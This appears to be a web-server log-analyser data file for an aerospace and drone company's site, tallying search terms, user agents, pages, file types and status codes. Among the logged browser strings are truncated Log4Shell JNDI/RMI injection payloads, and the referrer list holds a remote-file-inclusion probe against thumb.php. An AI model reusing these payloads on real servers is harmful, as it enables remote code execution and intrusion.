n	Rq	1	36.935	tdw
n	Rq	32	184.677	luggage
n	Rq	1	36.935	opportunities
n	Rq	175	78.098	vuitton
n	Rq	1	36.935	show
n	Rq	1	110.806	the
n	Rq	1	36.935	luggages
n	Rq	1	36.935	stroke
n	Rq	2	36.935	explore
n	Rq	39	73.871	handbags
n	Rq	2	73.871	electric
n	Rq	1	36.935	space
n	Rq	1	73.871	air
n	Rq	1	36.935	quote
n	Rq	1	36.935	require
n	Rq	1	36.935	mpp
n	Rq	4	73.871	jobs
n	Rq	5	184.677	uas
n	Rq	1	36.935	anything
n	Rq	1	36.935	china
n	Rq	1	36.935	airplane
n	Rq	10	94.452	uav
n	Rq	2	36.935	wmaid.com
n	Rq	3	147.742	drone
n	Rq	7	258.548	fiberglass
n	Rq	2	36.935	facebook
n	Rq	1	36.935	college
n	Rq	4	147.742	onboard
n	Rq	3	73.871	gtaeronautics.com
n	Rq	1	36.935	qulificationa
n	Rq	21	205.259	simi
n	Rq	1	36.935	and
n	Rq	5	110.806	flight
n	Rq	17	205.259	at6
n	Rq	1	36.935	xtreme
n	Rq	1	36.935	maintenance
n	Rq	1	36.935	cody
n	Rq	1	36.935	systems
n	Rq	1	36.935	any
n	Rq	1	36.935	tom
n	Rq	1	36.935	payload
n	Rq	2	73.871	gta
n	Rq	2	36.935	granger
n	Rq	8	258.548	extreme
n	Rq	6	184.677	molding
n	Rq	2	36.935	easylifeapp
n	Rq	1	36.935	rating
n	Rq	2	36.935	whitelaw
n	Rq	126	258.548	fashion
n	Rq	2	73.871	ice
n	Rq	2	36.935	http://www.gtaeronautics.com/compnews.html
n	Rq	5	73.871	engineers
n	Rq	3	73.871	composite
n	Rq	1	36.935	skyforce
n	Rq	1	36.935	eengineer
n	Rq	175	78.098	louis
n	Rq	8	36.935	store
n	Rq	4	147.742	starter
n	Rq	14	147.742	cheap
n	Rq	1	36.935	diamond
n	Rq	10	57.517	bme
n	Rq	1	36.935	america2009
n	Rq	7	36.935	content
n	Rq	1	36.935	challenge
n	Rq	2	73.871	aeronautic
n	Rq	1	36.935	piece
n	Rq	1	36.935	how
n	Rq	1	36.935	male
n	Rq	2	73.871	design
n	Rq	2	73.871	flying
n	Rq	1	36.935	carbon
n	Rq	1	36.935	operation
n	Rq	2	36.935	profile
n	Rq	1	36.935	tomas
n	Rq	1	36.935	cia
n	Rq	1	36.935	hummingbird
n	Rq	1	36.935	iron
n	Rq	1	36.935	california
n	Rq	1	36.935	amphibian
n	Rq	1	36.935	110
n	Rq	1	36.935	mentioned
n	Rq	1	36.935	111
n	Rq	1	36.935	over
n	Rq	25	262.775	http://www.gtaeronautics.com/
n	Rq	1	36.935	google.com
n	Rq	1	36.935	fuel
n	Rq	2	36.935	inc
n	Rq	1	36.935	handbag.com
n	Rq	1	36.935	da42
n	Rq	2	73.871	certification
n	Rq	1	36.935	timing
n	Rq	1	36.935	2015
n	Rq	1	36.935	home
n	Rq	1	36.935	aerospacecompanies
n	Rq	1	36.935	anti
n	Rq	1	36.935	ziroli
n	Rq	1	36.935	sketches
n	Rq	5	36.935	purses
n	Rq	1	36.935	downlink
n	Rq	3	36.935	aeronotics
n	Rq	1	36.935	nanotechnology
n	Rq	1	36.935	zephyr
n	Rq	4	36.935	wyoming
n	Rq	2	36.935	technology
n	Rq	3	110.806	companies
n	Rq	1	36.935	muffler
n	Rq	2	36.935	avia
n	Rq	2	36.935	what
n	Rq	145	151.969	valley
n	Rq	1	36.935	microwave
n	Rq	1	36.935	mold
n	Rq	5	147.742	pglm
n	Rq	1	36.935	specialist
n	Rq	23	188.905	drawing
n	Rq	1	36.935	tool
n	Rq	1	36.935	security
n	Rq	6	73.871	prototypes
n	Rq	1	36.935	giant
n	Rq	1	36.935	powell
n	Rq	8	258.548	aerospace
n	Rq	4	147.742	unmanned
n	Rq	34	135.615	aeronautics
n	Rq	1	36.935	radius
n	Rq	1	36.935	zero
n	Rq	1	36.935	tobbot
n	Rq	2	73.871	job
n	Rq	2	73.871	neverfull
n	Rq	1	36.935	onbordstarter
n	Rq	20	147.742	ca
n	Rq	1	73.871	as
n	Rq	13	205.259	at
n	Rq	5	184.677	techniques
n	Rq	1	36.935	does
n	Rq	1	36.935	commercial
n	Rq	1	36.935	www.gt
n	Rq	1	36.935	de
n	Rq	1	36.935	co
n	Rq	1	36.935	speedy
n	Rq	1	36.935	rpas
n	Rq	2	73.871	instrument
n	Rq	1	36.935	do
n	Rq	1	36.935	quotation
n	Rq	3	110.806	training
n	Rq	1	36.935	efi
n	Rq	1	36.935	careers
n	Rq	3	110.806	pilot
n	Rq	9	20.581	bandito
n	Rq	4	147.742	quotes
n	Rq	107	147.742	phone
n	Rq	1	36.935	stations
n	Rq	1	36.935	traing
N	*FR	2013	12	19	00	28
N	*LR	2020	10	14	09	11
N	*f	-200Q	s
N	RQ	25	4105501392	http://www.gtaeronautics.com/
N	RQ	20	3783946512	gt aeronautics
N	RQ	7	3462391632	bme extreme
N	RQ	7	3462391632	aerospace engineering drawings
N	RQ	20	2885326360	www.gtaeronautics.com
N	RQ	14	2629815968	aeronautical engineering drawing
N	RQ	6	2308261088	texan at6
N	RQ	5	2308261088	bandito pglm
N	RQ	3	1731195816	bandito uav
N	RQ	3	1731195816	onboard starter
N	RQ	2	1154130544	fiberglass molding techniques
N	RQ	6	1154130544	manufacturing aeronautical prototypes
N	RQ	19	1154130544	louis vuitton luggage outlet
N	RQ	10	1154130544	louis vuitton fashion valley phone
N	RQ	97	1154130544	louis vuitton fashion valley phone number
N	RQ	2	1154130544	texan at 6
N	RQ	18	1154130544	louis vuitton fashion valley ca
N	RQ	9	898620152	at 6 texan
N	RQ	1	577065272	uavs flying over simi valley ca
N	RQ	1	577065272	gt aeronautics simi valley california
N	RQ	1	577065272	aeronautical engineer quote
N	RQ	1	577065272	does aeronautical engineering require drawing?
N	RQ	1	577065272	how to do gt in engineering drawing
N	RQ	2	577065272	http://gtaeronautics.com/
N	RQ	1	577065272	the government college g.t aeronautics
N	RQ	1	577065272	bme engine
N	RQ	1	577065272	uas gcs
N	RQ	1	577065272	http://www.gtaeronautics.com/indnews.html
N	RQ	92	577065272	semalt.com
N	RQ	1	577065272	aero iron mentioned nanotechnology hummingbird uav
N	RQ	1	577065272	basic fiberglass techniques
N	RQ	1	577065272	http://gtaeronautics.com/indnews.html
N	RQ	1	577065272	finnemeccia co
N	RQ	2	577065272	drawing for customer satisfaction
N	RQ	1	577065272	cheap louis vuitton speedy handbag.com
N	RQ	1	577065272	at 6
N	RQ	1	577065272	quotation specialist engineer drawings
N	RQ	1	577065272	challenge xtreme 111 piece mechanics tool kit
N	RQ	1	577065272	uav commercial crew stations
N	RQ	1	577065272	da42 mpp microwave downlink bandwidth
N	RQ	1	577065272	anti ice de ice qinetiq zephyr
N	RQ	4	577065272	louis%20vuitton%20fashion%20valley%20phone%20number
N	RQ	1	577065272	faa uas pilot certification
N	RQ	1	577065272	any flying crews in gta
N	RQ	1	577065272	aerospace drawing
N	RQ	1	577065272	fiber glass molding job
N	RQ	1	577065272	aircraft design consultant
N	RQ	1	577065272	www.gt airplane.com
N	RQ	3	577065272	gt in aeronotics
N	RQ	1	577065272	tom rullman
N	RQ	1	577065272	gt aeronautics simi valley ca
N	RQ	1	577065272	drone base in simi valley
N	RQ	1	577065272	fiberglass mold making techniques
N	RQ	1	577065272	rpa instrument qualification faa instrument rating
N	RQ	1	577065272	extreme bme
N	RQ	1	577065272	uas faa maintenance
N	RQ	1	577065272	louis vuitton neverfull
N	RQ	1	577065272	fiberglass techniques
N	RQ	1	577065272	aircraft companies in simi valley
N	RQ	1	577065272	custom fiberglass moldings
N	RQ	11	577065272	louis vuitton luggage cheap
N	RQ	1	577065272	anything
N	RQ	1	577065272	aeronautical engineering sketches
N	RQ	1	577065272	gtaeronautics.com
N	RQ	1	577065272	giant scale ziroli at 6
N	RQ	9	577065272	outlet louis vuitton handbags
N	RQ	1	577065272	cowling drawing
N	RQ	1	577065272	mitsubishi zero
N	RQ	1	577065272	powell wy gt aeronautics
N	RQ	2	577065272	what is gt in basic engineering drawing
N	RQ	2	577065272	composite molding
N	RQ	1	577065272	aeronautics in simi valley and security work
N	RQ	3	577065272	gt aeronautics llc jobs
N	RQ	1	577065272	crew flight gta
N	RQ	1	577065272	110cc engine timing
N	RQ	1	577065272	aeronautical engineer quotes
N	RQ	2	577065272	http://www.gtaeronautics.com/compnews.html
N	RQ	4	577065272	wyoming flight engineers
N	RQ	1	577065272	a t 6
N	RQ	1	577065272	gt aeronautics unmanned air
N	RQ	1	577065272	fia gt composite tooling
N	RQ	1	577065272	uas pilot certification
N	RQ	1	577065272	quotes on aeronautical engineers
N	RQ	1	577065272	payload for diamond northrop twin engie aircraft
N	RQ	7	577065272	content
N	RQ	1	577065272	bme 110
N	RQ	1	577065272	thomas w rullman gt aeronautics
N	RQ	1	577065272	luggages for sale
N	RQ	2	577065272	easylifeapp profile
N	RQ	2	577065272	simi gt
N	RQ	1	577065272	mq1 design fuel
N	RQ	1	577065272	airplane as always cia america2009
N	RQ	1	577065272	eengineer drawing home
N	RQ	1	577065272	heavy equipment operator jobs
N	RQ	1	577065272	aero space drone simi valley
N	RQ	1	577065272	cheap louis vuitton luggage
N	RQ	1	577065272	2 stroke electric onboard starter
N	RQ	1	577065272	skyforce observer mk3
N	RQ	1	577065272	simi valley unmanned aircraft
N	RQ	2	577065272	granger whitelaw avia
N	RQ	1	577065272	louis vuitton fashion valley neverfull
N	RQ	1	577065272	louis vuitton job opportunities
N	RQ	1	577065272	google.com
N	RQ	1	577065272	uas operation training method
N	RQ	2	577065272	wmaid.com explore gtaeronautics.com
N	RQ	1	577065272	custum muffler 110cc
N	RQ	1	577065272	glass manufacturing drawings
N	RQ	1	577065272	electric motors x male uav x sale
N	RQ	1	577065272	aerospacecompanies in simi valley
N	RQ	1	577065272	fiberglass molding
N	RQ	2	577065272	aeronautical technology inc
N	RQ	1	577065272	taranis ucav
N	RQ	1	577065272	vegas drone uav show december 2015
N	RQ	1	577065272	uav companies in simi valley
N	RQ	1	577065272	unmanned aircraft systems pilot training
N	RQ	2	577065272	installerex facebook
N	RQ	3	577065272	texan at6 photos
N	RQ	1	577065272	aeronautic engineer
N	RQ	30	577065272	designer handbags outlet sale
N	RQ	1	577065272	rpas qulificationa traing with faa
N	RQ	1	577065272	faa uav training
N	RQ	1	577065272	uav companies simi valley
N	RQ	5	577065272	louis vuitton purses outlet
N	RQ	1	577065272	aeronautics
N	RQ	1	577065272	cheap louis vuitton luggage outlet
N	RQ	1	577065272	gt aeronautics tomas rullman
N	RQ	1	577065272	tobbot
N	RQ	1	577065272	radius tdw efi fuze
N	RQ	8	577065272	manufacturing equipment store in simi valley
N	RQ	1	577065272	aeronautic engineer quotes
N	RQ	1	577065272	onbordstarter
N	RQ	1	577065272	rotax amphibian unmanned china
N	RQ	1	577065272	aeronautical engineering quotes
N	RQ	1	577065272	drawing aircraft engineering
N	RQ	1	577065272	gt aeronautics careers
N	RQ	1	577065272	gt aeronautics bandito
N	RQ	1	577065272	cody wy carbon fiber
N	RQ	8	321554880	at6 texan
B	*f	-40R	r
B	Rb	71380	2.898	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	60118	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
B	Rb	59405	1.116	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	55662	1.638	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	40898	4.266	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	39815	1.266	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	16320	0.954	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	16046	2.168	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	13492	0.266	Googlebot-Image/1.0
B	Rb	13151	1.399	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	12964	1.355	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	12213	0.333	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1;  http://www.apple.com/go/applebot)
B	Rb	12153	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
B	Rb	12061	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
B	Rb	11000	0.689	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	10308	0.616	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	9648	0.435	Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36
B	Rb	8061	0.886	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	7656	0.067	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
B	Rb	7492	0.408	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7444	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
B	Rb	7221	0.210	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	7181	0.200	Mozilla/4.0 (compatible;)
B	Rb	6742	0.190	Mozilla/5.0 (compatible; BLEXBot/1.0;  http://webmeup-crawler.com/)
B	Rb	6482	0.307	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6343	0.424	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
B	Rb	6198	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
B	Rb	6164	0.044	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.345	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6079	0.224	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5934	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
B	Rb	5848	0.260	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	5568	0.479	PRurl
B	Rb	5436	0.296	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5340	0.400	Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
B	Rb	5308	0.127	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5291	0.315	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	5290	0.193	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/13.0.1
B	Rb	4978	0.246	Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)
B	Rb	4941	0.118	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	1083865	74.860	[not listed: 22124]
b	*f	-15Q	s
b	lRQq	1	798590	3746221309	110.472	Netscape
b	lRQq	2	1329	4039456946	119.120	Mozilla/114
b	lRQq	2	1991	4171545880	123.015	Mozilla/50
b	lRQq	2	4312	4171545880	123.015	Mozilla/40
b	lRQq	2	1316	4039456904	119.120	Mozilla/94
b	lRQq	2	1176	4039456904	119.120	Mozilla/95
b	lRQq	2	436	4039456904	119.120	Mozilla/96
b	lRQq	2	1272	4039456904	119.120	Mozilla/73
b	lRQq	2	759	4039456904	119.120	Mozilla/75
b	lRQq	2	717	4039456904	119.120	Mozilla/77
b	lRQq	2	431	4039456904	119.120	Mozilla/80
b	lRQq	2	1676	4039456904	119.120	Mozilla/89
b	lRQq	2	929	3849991000	113.532	Mozilla/62
b	lRQq	2	1526	3849991000	113.532	Mozilla/5
b	lRQq	2	1065	3783946512	111.585	Mozilla/11
b	lRQq	2	2324	3783946512	111.585	Mozilla/29
b	lRQq	2	1581	3783946512	111.585	Mozilla/68
b	lRQq	2	1153	3783946512	111.585	Mozilla/8
b	lRQq	2	529	3783946512	111.585	Mozilla/30
b	lRQq	2	804	3783946512	111.585	Mozilla/35
b	lRQq	2	1144	3783946512	111.585	Mozilla/42
b	lRQq	1	597	3660525101	107.945	curl
b	lRQq	2	6	577065275	17.017	curl/479488
b	lRQq	2	584	1929329282	56.894	curl/7
b	lRQq	2	6	577065272	17.017	curl/8
b	lRQq	1	1223	2885326362	85.085	facebookexternalhit
b	lRQq	2	1223	2885326362	85.085	facebookexternalhit/1
b	lRQq	1	3623	3660525099	107.945	Apache-HttpClient
b	lRQq	2	3622	3083459827	90.928	Apache-HttpClient/4
b	lRQq	2	1	577065272	17.017	Apache-HttpClient/UNAVAILABLE
b	lRQq	1	192	3462391632	102.103	Client
b	lRQq	2	6	577065272	17.017	Client/38550
b	lRQq	2	18	577065272	17.017	Client/35574
b	lRQq	2	12	577065272	17.017	Client/33911
b	lRQq	2	42	577065272	17.017	Client/34739
b	lRQq	2	66	577065272	17.017	Client/36782
b	lRQq	2	48	577065272	17.017	Client/35843
b	lRQq	1	11	4039456904	119.120	WhatsApp
b	lRQq	2	11	4039456904	119.120	WhatsApp/2
b	lRQq	1	27	4039456904	119.120	${${lower:jndi}:${lower:rmi}:
b	lRQq	2	6	1154130544	34.034	${${lower:jndi}:${lower:rmi}://144
b	lRQq	2	4	1154130544	34.034	${${lower:jndi}:${lower:rmi}://51
b	lRQq	2	10	577065272	17.017	${${lower:jndi}:${lower:rmi}://188
b	lRQq	2	3	577065272	17.017	${${lower:jndi}:${lower:rmi}://185
b	lRQq	2	4	577065272	17.017	${${lower:jndi}:${lower:rmi}://167
b	lRQq	1	43	4039456904	119.120	com.google.android.apps.searchlite
b	lRQq	2	2	1154130544	34.034	com.google.android.apps.searchlite/484573
b	lRQq	2	25	577065272	17.017	com.google.android.apps.searchlite/763965
b	lRQq	2	6	577065272	17.017	com.google.android.apps.searchlite/784321
b	lRQq	2	1	577065272	17.017	com.google.android.apps.searchlite/677613
b	lRQq	2	6	577065272	17.017	com.google.android.apps.searchlite/602374
b	lRQq	2	3	577065272	17.017	com.google.android.apps.searchlite/426028
b	lRQq	1	122	4039456904	119.120	MSIE or
b	lRQq	1	309	3594480608	105.998	Dalvik
b	lRQq	2	282	1797240304	52.999	Dalvik/2
b	lRQq	2	27	1797240304	52.999	Dalvik/1
b	lRQq	1	96	3462391632	102.103	WWW-Mechanize
b	lRQq	2	95	2885326360	85.085	WWW-Mechanize/1
b	lRQq	2	1	577065272	17.017	WWW-Mechanize/0
b	lRQq	1	4154	3215548800	94.823	Java
b	lRQq	2	4120	2061418256	60.789	Java/1
b	lRQq	2	34	1154130544	34.034	Java/11
b	lRQq	1	54	3206881240	94.568	Google
b	lRQq	2	50	2052750696	60.534	Google/2
b	lRQq	2	4	1154130544	34.034	Google/1
b	lRQq	1	117	2951370848	87.033	NSPlayer
b	lRQq	2	16	2308261088	68.068	NSPlayer/10
b	lRQq	2	17	2308261088	68.068	NSPlayer/9
b	lRQq	2	5	1154130544	34.034	NSPlayer/12
b	lRQq	2	78	898620152	26.499	NSPlayer/11
b	lRQq	2	1	577065272	17.017	NSPlayer/8
b	lRQq	1	232	2885326360	85.085	DomainCrawler
b	lRQq	2	15	1154130544	34.034	DomainCrawler/1
b	lRQq	2	83	1154130544	34.034	DomainCrawler/2
b	lRQq	2	134	577065272	17.017	DomainCrawler/3
b	lRQq	1	884258	2041883348	60.213	[not listed: 936]
p	*f	0Q	s
p	lR	1	815448	Windows
p	lR	2	353299	Unknown Windows
p	lR	2	196536	Windows NT
p	lR	2	249316	Windows XP
p	lR	2	2233	Windows 95
p	lR	2	408	Windows CE
p	lR	2	2367	Windows 98
p	lR	2	9475	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	347532	OS unknown
p	lR	1	134996	Unix
p	lR	2	131920	Linux
p	lR	2	22	SunOS
p	lR	2	66	BSD
p	lR	2	2985	Other Unix
p	lR	2	3	HP-UX
p	lR	1	171639	Macintosh
p	lR	2	167059	Unknown Macintosh
p	lR	2	3242	Macintosh PowerPC
p	lR	2	1338	Macintosh 68k
p	lR	1	223950	Known robots
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	47	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	588347	0.000	/images/
i	lRc	1	871575	0.000	[root directory]
i	lRc	1	156199	0.000	/js/
i	lRc	1	80342	0.000	/css/
i	lRc	1	8235	0.000	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	260	0.000	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	26614	59	0.000	/links.html
r	lRSc	1	33461	33	0.000	/compnews.html
r	lRSc	1	37242	33	0.000	/aboutus.html
r	lRSc	1	24236	29	0.000	/consultinga.html
r	lRSc	1	23724	29	0.000	/cct&m.html
r	lRSc	1	20633	29	0.000	/pna.html
r	lRSc	1	26178	29	0.000	/contactus.html
r	lRSc	1	11314	26	0.000	/gt380+rpas.html
r	lRSc	1	20280	24	0.000	/indevents.html
r	lRSc	1	22998	24	0.000	/cfmt.html
r	lRSc	1	15112	24	0.000	/sru.html
r	lRSc	1	11106	24	0.000	/gt1500+rpas.html
r	lRSc	1	6680	23	0.000	/gt100hl+rpas.html
r	lRSc	1	28078	23	0.000	/uasfc.html
r	lRSc	1	10628	19	0.000	/gt50t+rpas.html
r	lRSc	1	18113	19	0.000	/faq.html
r	lRSc	1	30225	18	0.000	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	19760	15	0.000	/employment.html
r	lRSc	1	12854	10	0.000	/rd.html
r	lRSc	1	939	5	0.000	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	1548	4	0.000	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	911	4	0.000	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	4350	2	0.000	/banditomav.html
r	lRSc	1	774	2	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	647	2	0.000	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4512	2	0.000	/uavengines.html
r	lRSc	1	3975	1	0.000	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	987	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	4317	0	0.000	/gtatexan.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	513977	43.756	.jpg  [JPEG graphics]
t	lRb	1	432683	26.229	.html [Hypertext Markup Language]
t	lRb	1	390652	18.517	[directories]
t	lRb	1	3416	5.242	.mp4
t	lRb	1	778	2.157	.wmv
t	lRb	1	87	2.118	.mpg  [MPEG movie]
t	lRb	1	18734	0.911	.asp  [Active Server REQUESTS]
t	lRb	1	74475	0.296	.gif  [GIF graphics]
t	lRb	1	156245	0.254	.js  [JavaScript code]
t	lRb	1	80358	0.225	.css  [Cascading Style Sheets]
t	lRb	1	4819	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	30216	0.084	[not listed: 6]
z	*FR	2023	04	05	20	41
z	*LR	2023	05	09	10	03
z	ScR	0	0.000	84837	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	0	0.000	85122	101b-  1kb
z	ScR	0	0.000	509907	1kb- 10kb
z	ScR	0	0.000	352085	10kb-100kb
z	ScR	0	0.000	104639	100kb-  1Mb
z	ScR	0	0.000	4584	1Mb- 10Mb
z	ScR	0	0.000	55	10Mb-100Mb
z	ScR	0	0.000	13	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2024	02	15	05	58
c	*f	0R	a
c	R	1598998	200 OK
c	R	8632	206 Partial content
c	R	177	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	98810	304 Not modified since last retrieval
c	R	1069	400 Bad request
c	R	207	401 Authentication required
c	R	472	403 Access forbidden
c	R	629512	404 Document not found
c	R	2220	405 Method not allowed
c	R	934	406 Document not acceptable to client
c	R	141	416 Requested range not valid
c	R	624	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2024	02	15	05	45
I	*f	-30S	s
